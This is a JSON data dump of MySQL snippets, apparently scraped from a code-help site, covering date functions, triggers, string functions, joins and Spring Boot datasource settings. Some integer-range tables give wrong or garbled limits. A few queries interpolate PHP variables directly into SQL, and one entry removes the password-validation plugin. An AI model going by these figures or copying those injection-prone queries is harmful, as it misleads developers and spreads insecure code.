    "reg_date": "2021-10-12T09:57:42.000Z"
  },
  {
    "id": 2432,
    "keyword": null,
    "link": null,
    "title": " mysql size int",
    "description": "Type \t    Storage (Bytes)\tMinimum Value Signed \tMinimum Value Unsigned\tMaximum Value Signed\tMaximum Value Unsigned TINYINT \t1\t\t\t\t-128 \t\t\t\t\t0 \t\t\t\t\t\t127 \t\t\t\t\t255 SMALLINT \t2 \t\t\t\t-32768 \t\t\t\t\t0 \t\t\t\t\t\t32767 \t\t\t\t\t65535 MEDIUMINT \t3 \t\t\t\t-8388608 \t\t\t\t0 \t\t\t\t\t\t8388607 \t\t\t\t16777215 INT \t\t4 \t\t\t\t-2147483648 \t\t\t0 \t\t\t\t\t\t2147483647 \t\t\t\t4294967295 BIGINT \t\t8 \t\t\t\t-263 \t\t\t\t\t0 \t\t\t\t\t\t2^63-1 \t\t\t\t\t2^64-1\n",
    "reg_date": "2021-10-12T09:57:42.000Z"
  },
  {
    "id": 2433,
    "keyword": null,
    "link": null,
    "title": " mysql slave status",
    "description": "SHOW SLAVE STATUS \\G;\nSHOW SLAVE STATUS\n",
    "reg_date": "2021-10-12T09:57:42.000Z"
  },
  {
    "id": 2434,
    "keyword": null,
    "link": null,
    "title": " mysql sleep",
    "description": "SELECT SLEEP(5);    -- 5 seconds DO SLEEP(5);\t\t-- same, output available\n",
    "reg_date": "2021-10-12T09:57:42.000Z"
  },
  {
    "id": 2435,
    "keyword": null,
    "link": null,
    "title": " mysql smallint range",
    "description": "--\t\t\tSIGNED\t\t\t\t\t\t\t\t\t\t  UNSIGNED --\t\t\tMin               \t\tMax                   Min Max TINYINT     -128                    127                   0   255 SMALLINT    -32767                  32767                 0   65535 MEDIUMINT   -8388608                388608                0   16777215 INT         -2147483648             2147483647            0   4294967295 INTEGER     -2147483648             2147483647            0   4294967295 BIGINT      -9223372036854775808    9223372036854775808   0   18446744073709551615\n",
    "reg_date": "2021-10-12T09:57:42.000Z"
  },
  {
    "id": 2436,
    "keyword": null,
    "link": null,
    "title": " mysql some functions",
    "description": "MySQL Miscel&shy;laneous Functions BIT_COUNT DES_EN&shy;CRYPT DATABASE DES_DE&shy;CRYPT USER LAST_I&shy;NSE&shy;RT_ID SYSTEM&shy;_USER FORMAT SESSIO&shy;N_USER VERSION CURREN&shy;T_USER CONNEC&shy;TION_ID PASSWORD GET_LOCK OLD_PA&shy;SSWORD RELEAS&shy;E_LOCK ENCRYPT IS_FRE&shy;E_LOCK DECODE BENCHMARK MD5 INET_NTOA SHA1 INET_ATON AES_EN&shy;CRYPT FOUND_ROWS AES_DE&shy;CRYPT STRCMP\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2437,
    "keyword": null,
    "link": null,
    "title": " mysql sort by date column",
    "description": "SELECT * FROM members ORDER BY date_of_birth DESC; -- Dates are newest at the top of the table SELECT * FROM members ORDER BY date_of_birth; -- Dates are oldest at the top of the table\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2438,
    "keyword": null,
    "link": null,
    "title": " mysql sort descending",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2 ASC;\t-- col1 DESC then col2 ASC\nSELECT column_name(s) FROM table_name ORDER BY column_name(s) ASC|DESC \n    SELECT     column_name1, column_name2, column_name3 FROM     table_name ORDER BY     column_name1 [ASC|DESC],     column_name2 [ASC|DESC],    ...;\nTo get the sorted result from MySQL select statement we use order by clause with SELECT statement.  Syntax: SELECT column_list FROM tablename ORDER BY column_name1 [ASC][DESC],column_name2 [ASC][DESC],...\nSELECT     select_list FROM     table_name ORDER BY     column1 [ASC|DESC],     column2 [ASC|DESC],    ...;\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2439,
    "keyword": null,
    "link": null,
    "title": " mysql split string",
    "description": "CREATE FUNCTION `SPLIT_STRING`( \tstr VARCHAR(255) , \tdelim VARCHAR(12) , \tpos INT ) RETURNS VARCHAR(255) CHARSET utf8 RETURN REPLACE( \tSUBSTRING( \t\tSUBSTRING_INDEX(str , delim , pos) , \t\tCHAR_LENGTH( \t\t\tSUBSTRING_INDEX(str , delim , pos - 1) \t\t) + 1 \t) , \tdelim , \t'' );  SELECT \t-- keyword 1 \tSPLIT_STRING(`keywords`,',',1) AS keyword_1, \t-- keyword 4, NOT trimmed \tSPLIT_STRING(`keywords`,',',4) AS keyword_4, \t-- keyword 4, trimmed \ttrim(SPLIT_STRING(`keywords`,',',4)) AS keyword_4_trimmed FROM `test`;\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2440,
    "keyword": null,
    "link": null,
    "title": " mysql spring boot application.properties",
    "description": "spring.datasource.url=jdbc:mysql://localhost:yourDatabase?serverTimezone=UTC //set username and password as environment variables under application configuration so that the real ones won't be pushed to github, only their aliases: USERNAME and PASSWORD in this case.  spring.datasource.username=${USERNAME} // instead of ${USERNAME} you may use a generic one as well, like 'root' but then it will be pushed to github with the app so anyone can see you username and password. spring.datasource.password=${PASSWORD} spring.jpa.hibernate.ddl-auto=create-drop //running after the first time (when the tables are created in the database) or later when you want the data remain for later tests you have to change the key word 'create-drop' to 'update' so that the data remains in place. Oops! the database itself without the tables needs to be created manually first. spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQL5Dialect spring.logging.level.org.hibernate.SQL=debug spring.jpa.show-sql=true\nspring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\nspring.datasource.url=jdbc:mysql://localhost:3306/myDb spring.datasource.username=user1 spring.datasource.password=pass spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2441,
    "keyword": null,
    "link": null,
    "title": " mysql spring boot configuration",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePassword spring.datasource.driver-class-name =com.mysql.jdbc.Driver #spring.jpa.show-sql: trueCopy\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2442,
    "keyword": null,
    "link": null,
    "title": " mysql sql.gz",
    "description": "pv mydump.sql.gz | gunzip | mysql -u root -p <database name> \n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2443,
    "keyword": null,
    "link": null,
    "title": " mysql sql add created updated timestamp to existing table",
    "description": "ALTER TABLE t1 ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP;\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2444,
    "keyword": null,
    "link": null,
    "title": " mysql start ubuntu",
    "description": "sudo service mysql start \nsudo service mysql-server\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2445,
    "keyword": null,
    "link": null,
    "title": " mysql status",
    "description": "sudo service mysql status # or ps aux | grep mysql # connexion: mysql -u <username> -p <database-name>\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2446,
    "keyword": null,
    "link": null,
    "title": " mysql stop password policy",
    "description": "uninstall plugin validate_password\n",
    "reg_date": "2021-10-12T09:57:43.000Z"
  },
  {
    "id": 2447,
    "keyword": null,
    "link": null,
    "title": " mysql store ip address",
    "description": "-- `ip_address` int(4) unsigned NOT NULL INSERT INTO my_table (`ip_address`) VALUES (INET_ATON(\"127.0.0.1\")); SELECT INET_NTOA(ip_address) as ip FROM my_table; -- php <?php var_dump(ip2long('123.63.153.253'));\t-- 2067765757 var_dump(long2ip(2067765757));\t\t\t-- \"123.63.153.253\" ?>\n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2448,
    "keyword": null,
    "link": null,
    "title": " mysql stored procedure parameters",
    "description": "-- Stored Procedure with parameters with default -- this examble return all clients in all states if parameter is NULL  DELIMITER $$  CREATE PROCEDURE get_clients_by_state ( \tstate CHAR(2) ) BEGIN \tSELECT  \t\t* \tFROM \t\tclients c     WHERE c.state =  IFNULL(state, c.state); END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL get_client_by_state(NULL);\n-- Stored Procedure with parameters with default  DELIMITER $$  CREATE PROCEDURE get_clients_by_state ( \tstate CHAR(2) ) BEGIN \tIF state IS NULL THEN     \tSET state = 'CA';     END IF;  \tSELECT  \t\t* \tFROM \t\tclients c     WHERE c.state =  state; END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL get_client_by_state(NULL);\n-- Stored Procedure with parameters  DELIMITER $$  CREATE PROCEDURE get_clients_by_state ( \tstate CHAR(2) ) BEGIN \tSELECT  \t\t* \tFROM \t\tclients c     WHERE c.state =  state; END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL get_client_by_state('CA'); \n                                     DELIMITER //  CREATE PROCEDURE GetOfficeByCountry( \tIN countryName VARCHAR(255) ) BEGIN \tSELECT *   \tFROM offices \tWHERE country = countryName; END //  DELIMITER ;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2449,
    "keyword": null,
    "link": null,
    "title": " mysql strict trans tables",
    "description": "SHOW VARIABLES LIKE 'sql_mode';\t\t-- enabled if STRICT_TRANS_TABLES is present SET GLOBAL sql_mode = '';\t\t\t\t\t\t\t-- disables strict mode SET GLOBAL sql_mode = 'STRICT_TRANS_TABLES';\t\t-- enables strict mode\n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2450,
    "keyword": null,
    "link": null,
    "title": " mysql string length",
    "description": "-- Relevant for MySQL only  -- syntax LENGTH(<your-string>)  -- example LENGTH('CountCharacters') -- OUTPUT: 15         123456789012345  -- example with query  SELECT 'CountCharacters',LENGTH('CountCharacters') FROM DUAL;  -- OUTPUT: CountCharacters, 15\nSELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql / PostGreSQL SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\n-- Relevant for MS SQL (SQL Server) LEN('string')\n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2451,
    "keyword": null,
    "link": null,
    "title": " mysql string position",
    "description": "POSITION(substr IN str) \n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2452,
    "keyword": null,
    "link": null,
    "title": " mysql subdate",
    "description": "SELECT SUBDATE(NOW(), INTERVAL 1 DAY);  --Yesterday \n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2453,
    "keyword": null,
    "link": null,
    "title": " mysql subtract month from timestamp",
    "description": "DATE_SUB((DATE_SUB(curdate(), INTERVAL 1 MONTH)), INTERVAL 4 DAY)\n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2454,
    "keyword": null,
    "link": null,
    "title": " mysql subtract number to field",
    "description": "UPDATE a75ting.username SET points = points - 5\n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2455,
    "keyword": null,
    "link": null,
    "title": " mysql sum group by",
    "description": "-- SELECT SUM(<column_name>) FROM <table_name> WHERE <condition>; SELECT SUM(amount) FROM invoices; SELECT client_name, SUM(amount) FROM invoices GROUP BY client_name;\n-- Sum Columns only show up in SELECT statement  -- All other columns must be in both SELECT categories_column, SUM(units_column) AS total_units FROM schema.table GROUP BY categories_column;\n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2456,
    "keyword": null,
    "link": null,
    "title": " mysql sum with group by",
    "description": "-- Sum Columns only show up in SELECT statement  -- All other columns must be in both SELECT categories_column, SUM(units_column) AS total_units FROM schema.table GROUP BY categories_column;\n",
    "reg_date": "2021-10-12T09:57:44.000Z"
  },
  {
    "id": 2457,
    "keyword": null,
    "link": null,
    "title": " mysql sum with if",
    "description": "SELECT SUM(IF( `column` = 1, `column`, 0)) as total\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2458,
    "keyword": null,
    "link": null,
    "title": " mysql switch case",
    "description": "SELECT CASE lower(col1) \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 = 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nmysql> SELECT CASE  WHEN 2>3 THEN 'this is true' ELSE 'this is false' END;  +-------------------------------------------------------------+ | CASE  WHEN 2>3 THEN 'this is true' ELSE 'this is false' END | +-------------------------------------------------------------+ | this is false                                               |  +-------------------------------------------------------------+\nSELECT     CASE          WHEN             column IS NULL OR another_column = 1         THEN             'yes'          ELSE             'no'      END AS 'MyData' FROM     table_name;\n-- LABEL MOVIE LENGTH  select title, length, CASE  \t when length < 50 then 'very short film'      when length < 90 then 'short film'      when length < 120 then 'medium length film'      when length > 120 then 'long film'      else 'unknown length' END -- AS film_length from film;  -- SAME AS ABOVE BUT ON A CUSTOM NAMED COLUMN select title, length, CASE  \t when length < 50 then 'very short film'      when length < 90 then 'short film'      when length < 120 then 'medium length film'      when length > 120 then 'long film'      else 'unknown length' END  AS film_length from film;  -- RESULT +-----------------------------+--------+--------------------+ | title                       | length | film_length        | +-----------------------------+--------+--------------------+ | ACADEMY DINOSAUR            |     86 | short film         | | ACE GOLDFINGER              |     48 | very short film    | | ADAPTATION HOLES            |     50 | short film         | | AFFAIR PREJUDICE            |    117 | medium length film | | AFRICAN EGG                 |    130 | long film          | | AGENT TRUMAN                |    169 | long film          | | AIRPLANE SIERRA             |     62 | short film         | | AIRPORT POLLOCK             |     54 | short film         | | ALABAMA DEVIL               |    114 | medium length film | | ALADDIN CALENDAR            |     63 | short film         | | ALAMO VIDEOTAPE             |    126 | long film          | | ALASKA PHANTOM              |    136 | long film          | | ALI FOREVER                 |    150 | long film          | | ALICE FANTASIA              |     94 | medium length film | | ALIEN CENTER                |     46 | very short film    | \nSELECT  t2.company_name, t2.expose_new, t2.expose_used, t1.title, t1.status,  CASE status    when 'New' and t2.expose_new = 1 then 1    when 'New' and t2.expose_new = 2 then 2    when 'New' and t2.expose_new = 3 then 3    when 'Used' and t2.expose_used = 1 then 1    when 'Used' and t2.expose_used = 2 then 2    when 'Used' and t2.expose_used = 3 then 3 END as expose FROM `products` t1 join manufacturers t2 on t2.id = t1.seller where t1.seller = 4238\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2459,
    "keyword": null,
    "link": null,
    "title": " mysql sysdate",
    "description": " -- Sysdate in MySQL  SELECT SYSDATE();\t\t\t\t\t\t\t\t-- 2021-07-13 06:12  SELECT DATE_ADD(SYSDATE(), INTERVAL 1 DAY);\t-- 2021-07-14 06:12  SELECT DATE_ADD(SYSDATE(), INTERVAL -1 DAY);\t-- 2021-07-12 06:12  SELECT DATE(SYSDATE());\t\t\t\t\t\t-- 2021-07-13 00:00    -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2460,
    "keyword": null,
    "link": null,
    "title": " mysql sysdate - 1 day",
    "description": " -- Sysdate in MySQL  SELECT SYSDATE();\t\t\t\t\t\t\t\t-- 2021-07-13 06:12  SELECT DATE_ADD(SYSDATE(), INTERVAL 1 DAY);\t-- 2021-07-14 06:12  SELECT DATE_ADD(SYSDATE(), INTERVAL -1 DAY);\t-- 2021-07-12 06:12  SELECT DATE(SYSDATE());\t\t\t\t\t\t-- 2021-07-13 00:00    -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2461,
    "keyword": null,
    "link": null,
    "title": " mysql terminal list table",
    "description": "show table; /* database has to be selected first */\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2462,
    "keyword": null,
    "link": null,
    "title": " mysql text seaRCH",
    "description": "mysql> SELECT * FROM tutorial WHERE MATCH(title,description) AGAINST ('left right' IN NATURAL LANGUAGE MODE); +----+---------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | id | title               | description                                                                                                                                                                                            | +----+---------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ |  5 | SQL Full Outer Join | In SQL the FULL OUTER JOIN combines the results of both left and right outer joins and returns all (matched or unmatched) rows from the tables on both sides of the join clause.                       | |  3 | SQL Left Join       | The SQL LEFT JOIN, joins two tables and fetches rows based on a condition, which are matching in both the tables, and the unmatched rows will also be available from the table before the JOIN clause. | +----+---------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 2 rows in set (0.00 sec) \nSELECT * FROM table_name WHERE MATCH(col1, col2) AGAINST('search terms' IN NATURAL LANGUAGE MODE)  \nmysql>INSERT INTO tutorial (title,description) VALUES ('SQL Joins','An SQL JOIN clause combines rows from two or more tables. It creates a set of rows in a temporary table.'), ('SQL Equi Join','SQL EQUI JOIN performs a JOIN against equality or matching column(s) values of the associated tables. An equal sign (=) is used as comparison operator in the where clause to refer equality.'), ('SQL Left Join','The SQL LEFT JOIN, joins two tables and fetches rows based on a condition, which is matching in both the tables and the unmatched rows will also be available from the table before the JOIN clause.'), ('SQL Cross Join','The SQL CROSS JOIN produces a result set which is the number of rows in the first table multiplied by the number of rows in the second table, if no WHERE clause is used along with CROSS JOIN.'), ('SQL Full Outer Join','In SQL the FULL OUTER JOIN combines the results of both left and right outer joins and returns all (matched or unmatched) rows from the tables on both sides of the join clause.'), ('SQL Self Join','A self join is a join in which a table is joined with itself (which is also called Unary relationships), especially when the table has a FOREIGN KEY which references its own PRIMARY KEY.');\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2463,
    "keyword": null,
    "link": null,
    "title": " mysql text to decimal",
    "description": "SELECT CAST(colName AS DECIMAL(10,2)) FROM tableName\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2464,
    "keyword": null,
    "link": null,
    "title": " mysql text type max length",
    "description": "Type       | Approx. Length     | Exact Max. Length Allowed ----------------------------------------------------------- TINYTEXT   | 256 Bytes          |           255 characters TEXT       |  64 Kilobytes      |        65,535 characters MEDIUMTEXT |  16 Megabytes      |    16,777,215 characters LONGTEXT   |   4 Gigabytes      | 4,294,967,295 characters\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2465,
    "keyword": null,
    "link": null,
    "title": " mysql time",
    "description": "CURRENT_TIME return HH:ii:ss format time in mysql\n-- MySQL TIME Format: 'hh:mm:ss' -- MySQL DATETIME Format: 'YYYY-MM-DD hh:mm:ss'\n-- use DATE_FORMAT with %H %i -- SELECT DATE_FORMAT(MemberBookFacility.time, '%H:%i') \"45\": \"09:00\", \"24\": \"10:00\", \"42\": \"11:00\", \"48\": \"12:00\",  -- ONcakephp must use below format $this->virtualFields['time'] = \"DATE_FORMAT(MemberBookFacility.time, '%H:%i')\";\t// using this for use concat \t \t\treturn $this->find('list', array(           'conditions' => $conditions,           'fields' => array(             'MemberBookFacility.id',              'time',           ),           'order' => array(             'MemberBookFacility.time ASC',           ),         ));\nhh:ii:ss\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2466,
    "keyword": null,
    "link": null,
    "title": " mysql time  ago difference",
    "description": "public function convert_time_to_days($date) {        $current_date = date(\"Y-m-d H:m:s\");        $time = array();        $day = floor((strtotime($current_date) - strtotime($date)) / (60 * 60 * 24));          if ($day == 0) {            $hour = floor((strtotime($current_date) - strtotime($date)) / (60 * 60));              if ($hour == 0) {                $minute = floor((strtotime($current_date) - strtotime($date)) / (60));                $time = $minute . __d('course', \"minutes ago\");              } else {                $time = $hour . __d('course', \"hours ago\");            }               } else {            $time = $day . __d('course', \"days ago\");        }               return $time;    } \n #Need item created 12 hours ago or newer. Discards older than 12 hours \t created_at >= (NOW() - INTERVAL 12 HOUR)\n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2467,
    "keyword": null,
    "link": null,
    "title": " mysql timediff",
    "description": "SET @date1 = '2010-10-11 00:00:00', @date2 = '2010-10-10 00:00:00'; SELECT    TIMEDIFF(@date1, @date2) AS 'TIMEDIFF',   TIMESTAMPDIFF(hour, @date1, @date2) AS 'TIMESTAMPDIFF'; \n",
    "reg_date": "2021-10-12T09:57:45.000Z"
  },
  {
    "id": 2468,
    "keyword": null,
    "link": null,
    "title": " mysql timestamp format",
    "description": "-- Use the FROM_UNIXTIME() function in MySQL select from_unixtime(timestamp) from my_tbl;\n-- use DATE_FORMAT with %H %i -- SELECT DATE_FORMAT(MemberBookFacility.time, '%H:%i') \"45\": \"09:00\", \"24\": \"10:00\", \"42\": \"11:00\", \"48\": \"12:00\",  -- ONcakephp must use below format $this->virtualFields['time'] = \"DATE_FORMAT(MemberBookFacility.time, '%H:%i')\";\t// using this for use concat \t \t\treturn $this->find('list', array(           'conditions' => $conditions,           'fields' => array(             'MemberBookFacility.id',              'time',           ),           'order' => array(             'MemberBookFacility.time ASC',           ),         ));\nINSERT INTO ... VALUES ('YYYY-MM-DD HH:MM:SS');\n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2469,
    "keyword": null,
    "link": null,
    "title": " mysql timestamp in laravel migration",
    "description": "$table->timestamp('created_at')->default(DB::raw('CURRENT_TIMESTAMP'));\n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2470,
    "keyword": null,
    "link": null,
    "title": " mysql timestamp to date",
    "description": " DATE_FORMAT(FROM_UNIXTIME(`timestamp`), '%Y-%m-%d') AS 'send_date',  %H:%i:%s\n-- Use the FROM_UNIXTIME() function in MySQL select from_unixtime(timestamp) from my_tbl;\nINSERT INTO ... VALUES ('YYYY-MM-DD HH:MM:SS');\n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2471,
    "keyword": null,
    "link": null,
    "title": " mysql tinyint max value",
    "description": "--\t\t\tSIGNED\t\t\t\t\t\t\t\t\t\t  UNSIGNED --\t\t\tMin               \t\tMax                   Min Max TINYINT     -128                    127                   0   255 SMALLINT    -32767                  32767                 0   65535 MEDIUMINT   -8388608                388608                0   16777215 INT         -2147483648             2147483647            0   4294967295 INTEGER     -2147483648             2147483647            0   4294967295 BIGINT      -9223372036854775808    9223372036854775808   0   18446744073709551615\nFor MySQL database: In BIGINT(8), the number 8 represents how the data will be displayed. It does not affect the storage. The number is used to display width.  BIGINT takes 8 bytes i.e. 64 bits. The signed range is -9223372036854775808 to 9223372036854775807 and unsigned range takes positive value. The range of unsigned is 0 to 18446744073709551615.\n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2472,
    "keyword": null,
    "link": null,
    "title": " mysql to get column name in database",
    "description": "SELECT table_name, column_name from information_schema.columns WHERE column_name LIKE '%column_name_to_search%';\n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2473,
    "keyword": null,
    "link": null,
    "title": " mysql to lowercase",
    "description": "+--------------------+ | LOWER('ATTENTION') | +--------------------+ | attention          | +--------------------+\nUPDATE my_table SET my_column = LOWER(my_column)\n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2474,
    "keyword": null,
    "link": null,
    "title": " mysql to uppercase",
    "description": "UPDATE my_table SET my_column = UPPER(my_column)\nSELECT upper('Hello World');\t\t-- HELLO WORLD SELECT lower('Hello World');\t\t-- hello world\n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2475,
    "keyword": null,
    "link": null,
    "title": " mysql trigger after update",
    "description": "CREATE TRIGGER after_sales_update AFTER UPDATE ON sales FOR EACH ROW BEGIN     IF OLD.quantity <> new.quantity THEN         INSERT INTO SalesChanges(salesId,beforeQuantity, afterQuantity)         VALUES(old.id, old.quantity, new.quantity);     END IF; END$$\n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2476,
    "keyword": null,
    "link": null,
    "title": " mysql trigger example",
    "description": "-- The following statement creates an AFTER UPDATE trigger on the sales table:  DELIMITER $$  CREATE TRIGGER after_sales_update AFTER UPDATE ON sales FOR EACH ROW BEGIN     IF OLD.quantity <> new.quantity THEN         INSERT INTO SalesChanges(salesId,beforeQuantity, afterQuantity)         VALUES(old.id, old.quantity, new.quantity);     END IF; END$$  DELIMITER ;\nCREATE     TRIGGER `event_name` BEFORE/AFTER INSERT/UPDATE/DELETE     ON `database`.`table`     FOR EACH ROW BEGIN \t\t-- trigger body \t\t-- this code is applied to every  \t\t-- inserted/updated/deleted row     END;      CREATE \tTRIGGER `blog_after_insert` AFTER INSERT  \tON `blog`  \tFOR EACH ROW BEGIN \t \t\tIF NEW.deleted THEN \t\t\tSET @changetype = 'DELETE'; \t\tELSE \t\t\tSET @changetype = 'NEW'; \t\tEND IF;      \t\tINSERT INTO audit (blog_id, changetype) VALUES (NEW.id, @changetype); \t\t     END$$\nCREATE TRIGGER trigger_name {BEFORE | AFTER} {INSERT | UPDATE| DELETE } ON table_name FOR EACH ROW trigger_body;\nCREATE TRIGGER Product_Details_tr  BEFORE INSERT ON Product_Details  FOR EACH ROW  SET NEW.User_ID = CURRENT_USER();\n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2477,
    "keyword": null,
    "link": null,
    "title": " mysql triggers",
    "description": "CREATE TRIGGER trigger_name {BEFORE | AFTER} {INSERT | UPDATE| DELETE } ON table_name FOR EACH ROW trigger_body;\n                                     DELIMITER $$  CREATE TRIGGER before_workcenters_insert BEFORE INSERT ON WorkCenters FOR EACH ROW BEGIN     DECLARE rowcount INT;          SELECT COUNT(*)      INTO rowcount     FROM WorkCenterStats;          IF rowcount > 0 THEN         UPDATE WorkCenterStats         SET totalCapacity = totalCapacity + new.capacity;     ELSE         INSERT INTO WorkCenterStats(totalCapacity)         VALUES(new.capacity);     END IF;   END $$  DELIMITER ; \n",
    "reg_date": "2021-10-12T09:57:46.000Z"
  },
  {
    "id": 2478,
    "keyword": null,
    "link": null,
    "title": " mysql trim",
    "description": "SELECT TRIM(' trim ');\nSELECT TRIM('=' FROM '=FRESH COOKIES!=') AS Trimmed; SELECT TRIM('=' FROM '====FRESH COOKIES!====') AS Trimmed;\n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2479,
    "keyword": null,
    "link": null,
    "title": " mysql trim spaces",
    "description": "UPDATE tablename set fieldname = TRIM(fieldname);\n`field` = TRIM(`field`);\n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2480,
    "keyword": null,
    "link": null,
    "title": " mysql trim whitespace",
    "description": "UPDATE tablename set fieldname = TRIM(fieldname);\n`field` = TRIM(`field`);\n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2481,
    "keyword": null,
    "link": null,
    "title": " mysql two column combination unique",
    "description": "CREATE TABLE `content_html` (   `id` int(11) NOT NULL AUTO_INCREMENT,   `id_box_elements` int(11) DEFAULT NULL,   `id_router` int(11) DEFAULT NULL,   `content` mediumtext COLLATE utf8_czech_ci NOT NULL,   PRIMARY KEY (`id`),   UNIQUE KEY `id_box_elements` (`id_box_elements`,`id_router`) );\nCREATE TABLE IF NOT EXISTS cliente ( \tid bigint primary key auto_increment,     nome varchar(100) not null,     email varchar(100) not null unique,     senha varchar(255) not null,     documento varchar(50) not null unique,     dataCadastro date not null ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4;\n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2482,
    "keyword": null,
    "link": null,
    "title": " mysql two joins",
    "description": "SELECT areas.name AS aname, COUNT(consultants.active) AS cct      FROM areas      LEFT JOIN consAreas        ON consAreas.area = areas.id      LEFT JOIN consultants        ON consultants.id = consAreas.cons    WHERE areas.areaID = $area       AND consultants.active = 1 GROUP BY areas.name ORDER BY areas.name \n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2483,
    "keyword": null,
    "link": null,
    "title": " mysql two wheres",
    "description": "SELECT suppliers.suppler_name, orders.order_id FROM suppliers, orders WHERE suppliers.supplier_id = orders.supplier_id AND suppliers.state = 'California';\n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2484,
    "keyword": null,
    "link": null,
    "title": " mysql union",
    "description": "SELECT supplier_id, supplier_name FROM suppliers WHERE supplier_id <= 500 UNION SELECT company_id, company_name FROM companies WHERE company_name = 'Apple' ORDER BY 2;\nCombines the results from 2 or more SELECT statements and returns only distinct values. Example: Returns the cities from the events and subscribers tables. SELECT city FROM events UNION SELECT city from subscribers;\n  SELECT City FROM Customers UNION ALL SELECT City FROM Suppliers   ORDER BY City;  \nSELECT a.* FROM ((SELECT id FROM mes_report_flow_card) UNION ALL (SELECT id FROM mes_report_part_work_order )) AS alimit 0,10;\n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2485,
    "keyword": null,
    "link": null,
    "title": " mysql unique select count",
    "description": "SELECT COUNT(DISTINCT productId) from  table_name WHERE keyword='$keyword' \n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2486,
    "keyword": null,
    "link": null,
    "title": " mysql unix timestamp to date",
